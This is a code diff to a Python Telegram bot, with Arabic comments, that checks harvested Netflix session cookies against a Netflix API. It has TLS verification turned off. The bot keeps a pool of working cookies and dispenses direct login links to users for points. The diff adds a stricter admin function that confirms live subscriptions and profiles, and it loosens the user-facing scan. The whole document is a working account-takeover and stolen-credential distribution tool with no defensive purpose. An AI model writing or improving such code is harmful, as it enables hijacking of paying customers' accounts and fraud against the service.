@@ -47,7 +47,7 @@ QUERY_PARAMS = {
     "idiom": "phone",
     "iosVersion": "15.8.5",
     "modelType": "IPHONE8-1",
-    "path": '["account","token","default"]',
+    "path": '["account","token","default","profiles"]',
     "pathFormat": "graph",
     "responseFormat": "json",
 }
@@ -88,6 +88,7 @@ def extract_clean_netflix_ids(text):
             cleaned_ids.append(decoded)
     return cleaned_ids
 
+# 1️⃣ الفحص العادي: يتأكد من وجود Token فقط لإضافة الحساب للمخزن
 def check_netflix_cookie_detailed(netflix_id):
     headers = dict(BASE_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
@@ -96,41 +97,11 @@ def check_netflix_cookie_detailed(netflix_id):
         if response.status_code == 200:
             data = response.json()
             value_data = data.get("value", {})
-            
-            # 1. فحص حالة العضوية لمنع الحسابات الملغاة أو التي تتطلب إعادة تفعيل (بكل لغات العالم)
-            membership_status = str(value_data.get("membershipStatus", "")).upper()
-            account_info_raw = value_data.get("account", {})
-            if isinstance(account_info_raw, dict):
-                acc_status = str(account_info_raw.get("membershipStatus", "")).upper()
-                if "CANCELED" in acc_status or "EXPIRED" in acc_status or "INACTIVE" in acc_status:
-                    return None
-            if "CANCELED" in membership_status or "EXPIRED" in membership_status or "INACTIVE" in membership_status:
-                return None
-
-            account_info = account_info_raw.get("token", {}).get("default", {})
+            account_info = value_data.get("account", {}).get("token", {}).get("default", {})
             token = account_info.get("token")
             expires = account_info.get("expires")
             
             if token:
-                # 2. التأكد من وجود خطة اشتراك نشطة وليست فارغة أو أساسية/إعلانات
-                plan_info = value_data.get("currentPlan", {}) or value_data.get("plan", {})
-                if not plan_info or plan_info == {}:
-                    return None
-                
-                plan_name = str(plan_info).lower()
-                is_premium = True
-                if "basic" in plan_name or "free" in plan_name or "ads" in plan_name:
-                    is_premium = False
-
-                if not is_premium:
-                    return None
-
-                # 3. التحقق من أن تاريخ الفواتير الصلاحية ليس في الماضي
-                if expires:
-                    exp_sec = expires // 1000 if len(str(expires)) == 13 else expires
-                    if exp_sec < time.time():
-                        return None
-
                 return {
                     "token": token, 
                     "expires": expires, 
@@ -141,6 +112,37 @@ def check_netflix_cookie_detailed(netflix_id):
     except Exception:
         return None
 
+# 2️⃣ الفحص الصارم المخصص لزر التصفية السرية: يتأكد من أن الاشتراك شغال وموجود به بروفايلات (Profiles)
+def check_cookie_strict_for_admin_cleaning(netflix_id):
+    headers = dict(BASE_HEADERS)
+    headers["Cookie"] = f"NetflixId={netflix_id}"
+    try:
+        response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=10, verify=False)
+        if response.status_code == 200:
+            data = response.json()
+            value_data = data.get("value", {})
+            
+            # التأكد من عدم وجود حالة إلغاء العضوية
+            account_data = value_data.get("account", {})
+            membership_status = str(value_data.get("membershipStatus", "") or account_data.get("membershipStatus", "")).upper()
+            if "CANCEL" in membership_status or "EXPIRED" in membership_status or "FORMER" in membership_status or "NEVER" in membership_status:
+                return False
+
+            # التأكد من وجود توكن الدخول
+            token = account_data.get("token", {}).get("default", {}).get("token")
+            if not token:
+                return False
+
+            # التأكد من وجود البروفايلات (Profiles) للحساب الشغال فعلياً
+            profiles = value_data.get("profiles", {})
+            if not profiles or len(profiles) == 0:
+                return False
+
+            return True
+        return False
+    except Exception:
+        return False
+
 def auto_clean_pool_job():
     global VALID_COOKIES_POOL
     while True:
@@ -149,7 +151,7 @@ def auto_clean_pool_job():
             print("🔄 جاري تنظيف المخزن تلقائياً...")
             still_valid = []
             for cookie in VALID_COOKIES_POOL:
-                if check_netflix_cookie_detailed(cookie):
+                if check_cookie_strict_for_admin_cleaning(cookie):
                     still_valid.append(cookie)
             VALID_COOKIES_POOL = still_valid
             print(f"✅ انتهى التنظيف. المتبقي: {len(VALID_COOKIES_POOL)}")
@@ -181,9 +183,8 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
     stop_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_scan_{chat_id}"))
     
     initial_status_text = (
-        f"⚡ **Processing Strict Scan**\n\n"
+        f"⚡ **Processing Scan**\n\n"
         f"Total Cookies: {total_count}\n"
-        f"Mode: Premium Only (Auto-Delete Dead)\n\n"
         f"Current Status:\n"
         f"[░░░░░░░░░░░░░░░░░░░░] 0%\n\n"
         f"🔍 Processing: 0/{total_count}\n"
@@ -237,9 +238,8 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
         if index % 2 == 0 or index == total_count:
             try:
                 live_status_text = (
-                    f"⚡ **Processing Strict Scan**\n\n"
+                    f"⚡ **Processing Scan**\n\n"
                     f"Total Cookies: {total_count}\n"
-                    f"Mode: Premium Only (Auto-Delete Dead)\n\n"
                     f"Current Status:\n"
                     f"[{progress_bar}] {progress_pct}%\n\n"
                     f"🔍 Processing: {index}/{total_count}\n"
@@ -253,7 +253,7 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
         time.sleep(0.1)
 
     active_scans.pop(chat_id, None)
-    safe_send_message(chat_id, f"📊 **اكتمل الفحص الصارم بنجاح!**\n\n👑 البريميوم الصالح: {valid_count}\n❌ التالف المحذوف: {dead_count}\n\n🪙 رصيدك الحالي: {USER_DATABASE[chat_id]['points']} نقطة 🪙")
+    safe_send_message(chat_id, f"📊 **اكتمل الفحص بنجاح!**\n\n👑 الحسابات الصالحة: {valid_count}\n❌ التالف المحذوف: {dead_count}\n\n🪙 رصيدك الحالي: {USER_DATABASE[chat_id]['points']} نقطة 🪙")
     if live_accounts_accumulator: 
         send_txt_file(chat_id, live_accounts_accumulator, source_name)
 
@@ -276,7 +276,7 @@ def send_txt_file(chat_id, accounts_list, original_filename):
             for item in accounts_list: 
                 f.write(item)
         with open(output_txt_path, 'rb') as doc:
-            bot.send_document(chat_id, doc, caption=f"📁 ملف الحسابات البريميوم الشغالة 🔥")
+            bot.send_document(chat_id, doc, caption=f"📁 ملف الحسابات الشغالة 🔥")
         if os.path.exists(output_txt_path): 
             os.remove(output_txt_path)
     except Exception as e: 
@@ -288,7 +288,7 @@ def generate_main_keyboard(user_id):
     markup = InlineKeyboardMarkup()
     markup.row_width = 1
     
-    markup.add(InlineKeyboardButton("🔍 فحص صارم (ملف/نص/رابط)", callback_data="menu_check"))
+    markup.add(InlineKeyboardButton("🔍 فحص (ملف/نص/رابط)", callback_data="menu_check"))
     
     if user_id == DEVELOPER_CHAT_ID:
         markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (صلاحية المطور ♾️)", callback_data="dispense_live_link"))
@@ -418,7 +418,7 @@ def execute_dispense_logic(chat_id):
             
             points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 وضع VIP" if role == "VIP" else f"{USER_DATABASE[chat_id]['points']} نقطة")
             success_text = (
-                f"🎉 **تفضل رابط نتفلكس الطازج الخاص بك** 🎉\n\n"
+                f"🎉 **تفضل رابط نتفلكس الخاص بك** 🎉\n\n"
                 f"🪙 رصيدك المتبقي الحالي: {points_display}.\n"
                 f"📅 **تاريخ الفواتير القادم:** {date_str}\n\n"
                 f"🔗 **رابط الدخول المباشر المؤقت:**\n{direct_netflix_url}\n\n"
@@ -558,14 +558,14 @@ def handle_user_feedback(call):
 def open_admin_panel_msg(chat_id):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("📢 إرسال إذاعة جماعية (Broadcast)", callback_data="admin_broadcast"))
-    markup.add(InlineKeyboardButton("🧹 تنظيف المخزن وحذف التالف", callback_data="admin_clean_pool"))
+    markup.add(InlineKeyboardButton("🧹 تصفية المخزن (حذف الاشتراكات المنتهية)", callback_data="admin_clean_pool"))
     markup.add(InlineKeyboardButton("🔄 تصفير الذاكرة والمكرر", callback_data="admin_clear_history"))
     
     stats_text = (
         f"👑 **مرحباً بك يا مطور البوت (فارس) في لوحتك السرية** 👑\n\n"
         f"📊 **إحصائيات البوت اللحظية:**\n"
         f"👥 إجمالي المستخدمين المسجلين: {len(USER_DATABASE)}\n"
-        f"📦 إجمالي الحسابات الشغالة بالمخزن: {len(VALID_COOKIES_POOL)}\n"
+        f"📦 إجمالي الحسابات بالمخزن: {len(VALID_COOKIES_POOL)}\n"
         f"🚫 إجمالي المحظورين: {len(BANNED_USERS)}\n"
         f"✂️ إجمالي الكوكيز في مانع التكرار: {len(USED_COOKIES_HISTORY)}"
     )
@@ -600,13 +600,14 @@ def process_broadcast_sending(message):
             
     bot.send_message(DEVELOPER_CHAT_ID, f"✅ تمت الإذاعة بنجاح! تم تسليم الرسالة إلى {sent_count} مستخدم نشط 🚀")
 
+# 🧹 زر التصفية الدقيقة والصرامة الخاص بالمطور (اللوحة السرية)
 @bot.callback_query_handler(func=lambda call: call.data == "admin_clean_pool")
 def clean_pool_manual_action(call):
     if call.message.chat.id != DEVELOPER_CHAT_ID:
         return
     
-    bot.answer_callback_query(call.id, "⏳ جاري فحص جميع حسابات المخزن وحذف التالف منها...")
-    status_msg = bot.send_message(DEVELOPER_CHAT_ID, "🧹 **بدأت عملية فحص وتنظيف المخزن...** يرجى الانتظار.")
+    bot.answer_callback_query(call.id, "⏳ جاري فحص حسابات المخزن وتصفية الاشتراكات المنتهية...")
+    status_msg = bot.send_message(DEVELOPER_CHAT_ID, "🧹 **بدأت عملية التصفية الدقيقة للمخزن...** يرجى الانتظار.")
     
     global VALID_COOKIES_POOL
     initial_count = len(VALID_COOKIES_POOL)
@@ -619,7 +620,8 @@ def clean_pool_manual_action(call):
     removed_count = 0
     
     for cookie in VALID_COOKIES_POOL:
-        if check_netflix_cookie_detailed(cookie):
+        # فحص إمكانية الوصول للبروفايلات وعدم وجود شاشة تجديد الاشتراك
+        if check_cookie_strict_for_admin_cleaning(cookie):
             still_valid.append(cookie)
         else:
             removed_count += 1
@@ -627,10 +629,10 @@ def clean_pool_manual_action(call):
     VALID_COOKIES_POOL = still_valid
     
     result_text = (
-        f"✅ **تم الانتهاء من تنظيف المخزن بنجاح!**\n\n"
-        f"📊 الحسابات قبل الفحص: {initial_count}\n"
-        f"👑 الحسابات الشغالة المتبقية: {len(VALID_COOKIES_POOL)}\n"
-        f"❌ الحسابات التالفة أو التي توقفت اشتراكاتها وتم حذفها: {removed_count}"
+        f"✅ **تمت تصفية المخزن بنجاح!**\n\n"
+        f"📊 الحسابات قبل التصفية: {initial_count}\n"
+        f"👑 الحسابات الشغالة ذات البروفايلات المتاحة: {len(VALID_COOKIES_POOL)}\n"
+        f"❌ الحسابات المنتهية الاشتراك (Restart Your Membership) التي تم حذفها: {removed_count}"
     )
     bot.edit_message_text(result_text, DEVELOPER_CHAT_ID, status_msg.message_id)
 
